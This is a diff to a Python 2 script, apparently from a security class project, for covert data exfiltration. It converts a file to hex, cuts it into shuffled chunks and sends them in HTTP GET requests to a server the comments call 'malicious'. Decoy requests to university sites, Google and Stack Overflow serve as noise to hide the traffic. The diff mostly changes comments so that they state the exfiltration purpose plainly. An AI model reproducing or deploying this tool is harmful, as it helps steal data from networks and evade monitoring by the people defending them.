@@ -1,15 +1,17 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+
+# To forge HTTP requests
 import httplib
-import os
+# To convert a file to its hexadecimal representation
 import binascii
+
 import random
 import time
 
 
-
-# CONVERT FILE TO LIST OF POSITIONS AND CHUNKS OF HEXADECIMAL DATA
+#################################################################
 
 def convert_file_to_hex_string(filename):
 	"""
@@ -31,23 +33,24 @@ def convert_file_to_hex_string(filename):
 
 def hex_to_list_pos_data(hex_str):
 	"""
-	Takes an hexadecimal representation of a file, cuts it in small chunks (4 characters at a time) and arrange them in a random order. The output is a list of the position of the chunk in the original string and the chunk value.
+	Takes an hexadecimal representation (of a file in our case), cuts it in small chunks (4 characters at a time) and arrange them in a random order. The output is a list of the position of the chunk in the original string and the chunk value.
 	:param str hex_str:		hex representation of a file (see convert_file_to_hex_string)
 
 	:return list[list[int,str]]:	list of position and chuncks value
 	"""
     
 	n = 4
-    	list_pos_data = [[i//n, hex_str[i:i+n]] for i in range(0, len(hex_str), n)] # break into 2 bytes
+    	list_pos_data = [[i//n, hex_str[i:i+n]] for i in range(0, len(hex_str), n)]
 	random.shuffle(list_pos_data)
     
 	return list_pos_data
 
-# SIMULATE HTTP TRAFFIC (NOISE) TO MASK THE REQUESTS
+
+########################################################
 
 def create_random_request():
 	"""
-	Generate between 0 to 5 HTTP random requests to four different websites. 
+	Generate between 0 to 5 HTTP random requests to four different websites (in our case to simulate HTTP traffic = noise to mask our malicious requests.
 	"""
 
 	list_websites = ["www.vorlesungsverzeichnis.ethz.ch", "www.unil.ch", "www.google.com", "www.stackoverflow.com"]
@@ -68,14 +71,15 @@ def create_random_request():
 		conn.request("GET", ressource, "", headers)
 		conn.close()
 
-# FUNCTION TO SEND THE GET REQUESTS, WITH SOME NOISE AND RANDOM SLEEPS
 
 def send_get_requests_with_data(server, ressource, list_pos_data, request_type):
 	"""
-	param str server:		ip or dns name of the server
-	param str ressource		ressource to acces (example: '/index.html')
-	param list list_pos_data:	list of (data positions, data chunk)
-	param str request_type: 	"encryption", "key", "data" : to differentiate which data type is sent
+	Function that sends the malicious requests to the malicious server in the middle of some random traffic (noise). 
+	
+	param str server:		ip or dns name of the malicious server
+	param str ressource		ressource to access (example: '/index.html') on the malicious server.
+	param list list_pos_data:	list of (data positions, data chunk) to send.
+	param str request_type: 	"algo" or "data" : to differentiate which data type is sent (if it is the encryption algorithm or the actual data)
 
 	return list:			result of each request [status, reason, output], mostly for test and debug
 	"""
@@ -106,8 +110,8 @@ def send_get_requests_with_data(server, ressource, list_pos_data, request_type):
 
 if __name__ == "__main__":
 
-	# SERVER TO SEND DATA TO
-	server = "www.google.com"
+	# SERVER TO SEND DATA TO (malicious server)
+	server = "john-server"
 	ressource = "/index.html"
 	
 	# SEND THE ENCRYPTION ALGORITHM
@@ -128,8 +132,6 @@ if __name__ == "__main__":
 
 	results_data = send_get_requests_with_data(server, ressource, list_pos_data, "data")
 	
-	#for result in results_data:
-	#	print result
 
 
 
